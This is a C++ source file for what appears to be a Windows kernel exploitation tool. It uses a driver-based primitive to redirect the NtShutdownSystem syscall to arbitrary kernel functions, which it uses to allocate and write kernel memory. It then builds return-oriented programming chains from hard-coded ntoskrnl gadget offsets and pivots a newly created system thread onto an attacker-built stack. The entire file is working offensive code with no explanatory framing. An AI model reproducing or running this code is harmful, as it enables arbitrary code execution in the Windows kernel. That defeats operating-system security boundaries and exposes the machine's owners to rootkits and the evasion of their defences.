#include <include/driver/arbitrary_call.hpp>
#include <include/utils/utils.hpp>
#include <iostream>
#include <include/stack/stack_manager.hpp>

int main()
{
    if (!Utils::EnableDebugPrivilege())
    {
        std::exception("Failed to enable debug privileges");
        return EXIT_FAILURE;
    }

    const std::uintptr_t RandomValidThreadAddress = Utils::FindRandomValidThreadAddress();
    if (!RandomValidThreadAddress)
    {
        std::exception("Failed to find a random valid thread address");
        return EXIT_FAILURE;
    }

    const std::string WindowsBuild = Utils::GetWindowsDisplayVersion();
    if (WindowsBuild.empty())
    {
        std::exception("Failed to find the windows build being used");
        return EXIT_FAILURE;
    }

    std::printf("[+] Windows build: %s\n", WindowsBuild.c_str());
    std::printf("[+] New thread address to be used @ 0x%p\n", RandomValidThreadAddress);
    std::printf("[+] ntoskrnl.exe @ 0x%p\n", Driver::GetKernelModuleBase());

    Driver::ArbitraryCaller KernelCaller = Driver::ArbitraryCaller();

    const void* NtShutdownSystem = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtShutdownSystem");

    KernelCaller.RedirectCallByName("NtShutdownSystem", "MmAllocateContiguousMemory");
    void* PivotDataAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x58, (void*)MAXULONG64);
    void* DummyMemoryAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x8, (void*)MAXULONG64);
    void* IntervalArgAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x20, (void*)MAXULONG64);
    void* DestinationStringArg = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x20, (void*)MAXULONG64);
    void* SourceStringArg = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x20, (void*)MAXULONG64);
    void* ObjectAttributeArg = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(sizeof(OBJECT_ATTRIBUTES), (void*)MAXULONG64);
    void* OutputHandleArg = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x8, (void*)MAXULONG64);
    void* CurrentStackOffsetAddress = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x8, (void*)MAXULONG64);
    void* StackLimitStoreAddress = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x8, (void*)MAXULONG64);
    void* MainStackAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x6000, (void*)MAXULONG64);
    void* InitStackAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x6000, (void*)MAXULONG64);
    void* TimeoutAddr = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x20, (void*)MAXULONG64);
    KernelCaller.DisableRedirectByName("NtShutdownSystem");
    std::printf("[+] Main Stack @ 0x%p\n", MainStackAllocation);
    std::printf("[+] Init Stack @ 0x%p\n", InitStackAllocation);
    std::printf("[+] Current Stack Offset @ 0x%p\n", CurrentStackOffsetAddress);
    std::printf("[+] ObjectAttributeArg @ 0x%p\n", ObjectAttributeArg);

    if (!MainStackAllocation || !InitStackAllocation || !CurrentStackOffsetAddress || !StackLimitStoreAddress || !PivotDataAllocation)
        return EXIT_FAILURE;

    // Zero out stack allocation
    KernelCaller.RedirectCallByName("NtShutdownSystem", "RtlZeroMemory");
    reinterpret_cast<void* (*)(void*, size_t)>(NtShutdownSystem)(MainStackAllocation, 0x6000);
    reinterpret_cast<void* (*)(void*, size_t)>(NtShutdownSystem)(InitStackAllocation, 0x6000);
    reinterpret_cast<void* (*)(void*, size_t)>(NtShutdownSystem)(CurrentStackOffsetAddress, 0x8);
    KernelCaller.DisableRedirectByName("NtShutdownSystem");

    // Create usermode event
    const wchar_t* EventNameString = L"\\BaseNamedObjects\\Global\\MYSIGNALEVENT";
    HANDLE UmEvent = CreateEventW(NULL, FALSE, FALSE, L"Global\\MYSIGNALEVENT");
    std::printf("[+] Usermode event handle: %x\n", UmEvent);

    StackManager MainStackManager(Driver::GetKernelModuleBase(), (std::uintptr_t)MainStackAllocation + 0x2000, 0x2000);
    StackManager InitStackManager(Driver::GetKernelModuleBase(), (std::uintptr_t)InitStackAllocation + 0x2000, 0x2000);

    // set first and second arg
    MainStackManager.AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
    MainStackManager.AddPadding(0x8);
    MainStackManager.AddValue((std::uint64_t)OutputHandleArg, "FirstArg");
    MainStackManager.AddValue(TRUE, "SecondArg");
    MainStackManager.AddPadding(0x8);
    // deref first arg
    MainStackManager.AddGadget(0x4105b3, "mov rcx, qword ptr [rcx]; cmp rcx, rdx; sete al; ret;");
    // set third arg
    MainStackManager.AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
    MainStackManager.AddValue(NULL, "ThirdArg");
    MainStackManager.AddPadding(0x28);
    MainStackManager.AddFunctionCall("ZwWaitForSingleObject");

    // Open handle to usermode event in the kernel
    InitStackManager.AddFunctionCall("RtlInitUnicodeString", (std::uint64_t)DestinationStringArg, (std::uint64_t)SourceStringArg);
    InitStackManager.AddFunctionCall("ZwOpenEvent", (std::uint64_t)OutputHandleArg, EVENT_MODIFY_STATE | SYNCHRONIZE, (std::uint64_t)ObjectAttributeArg);

    InitStackManager.PivotStackIntoEthread(&MainStackManager, StackLimitStoreAddress, CurrentStackOffsetAddress, DummyMemoryAllocation);


    LARGE_INTEGER SleepInterval;
    SleepInterval.QuadPart = -10000000;

    OBJECT_ATTRIBUTES ObjectAttributesData;
    InitializeObjectAttributes(&ObjectAttributesData, (PUNICODE_STRING)DestinationStringArg, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    std::uint64_t CurrentStackOffsetStartValue = 0x2000;

    void* PivotJumpAddress = (void*)(Driver::GetKernelModuleBase() + 0x20043b);
    void* NewRspAddress = (void*)((uint64_t)InitStackAllocation + 0x2000);

    LARGE_INTEGER Timeout;
    Timeout.QuadPart = (-60 * 3) * 1000 * 1000 * 10;

    KernelCaller.RedirectCallByName("NtShutdownSystem", "memcpy");
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(TimeoutAddr, &Timeout, sizeof(Timeout));
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uint64_t)PivotDataAllocation + 0x50), &PivotJumpAddress, sizeof(PivotJumpAddress));
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uint64_t)PivotDataAllocation + 0x10), &NewRspAddress, sizeof(NewRspAddress));
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(SourceStringArg, (void*)EventNameString, lstrlenW(EventNameString) * 2 + 2);
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(IntervalArgAllocation, &SleepInterval, sizeof(SleepInterval));
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(ObjectAttributeArg, &ObjectAttributesData, sizeof(OBJECT_ATTRIBUTES));
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(CurrentStackOffsetAddress, &CurrentStackOffsetStartValue, sizeof(CurrentStackOffsetStartValue));
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)MainStackAllocation + 0x2000), MainStackManager.GetStackBuffer(), MainStackManager.GetStackSize());
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)InitStackAllocation + 0x2000), InitStackManager.GetStackBuffer(), InitStackManager.GetStackSize());
    KernelCaller.DisableRedirectByName("NtShutdownSystem");

    Sleep(500);
    std::cin.get();

    // mov rdx, qword ptr [rcx + 0x50]; mov rbp, qword ptr [rcx + 0x18]; mov rsp, qword ptr [rcx + 0x10]; jmp rdx;
    void* BootstrapGadget = (void*)(Driver::GetKernelModuleBase() + 0x698bd0);

    HANDLE KernelThreadHandle;
    KernelCaller.RedirectCallByName("NtShutdownSystem", "PsCreateSystemThread", (void*)NULL, (void*)BootstrapGadget, PivotDataAllocation);
    NTSTATUS ThreadCreation = reinterpret_cast<NTSTATUS(*)(PHANDLE, ULONG, POBJECT_ATTRIBUTES, HANDLE)>(NtShutdownSystem)(
        &KernelThreadHandle,
        THREAD_ALL_ACCESS,
        NULL,
        NULL
    );
    KernelCaller.DisableRedirectByName("NtShutdownSystem");

    KernelCaller.RedirectCallByName("NtShutdownSystem", "ZwClose");
    reinterpret_cast<void* (*)(HANDLE)>(NtShutdownSystem)(KernelThreadHandle);
    KernelCaller.DisableRedirectByName("NtShutdownSystem");

    return EXIT_SUCCESS;
}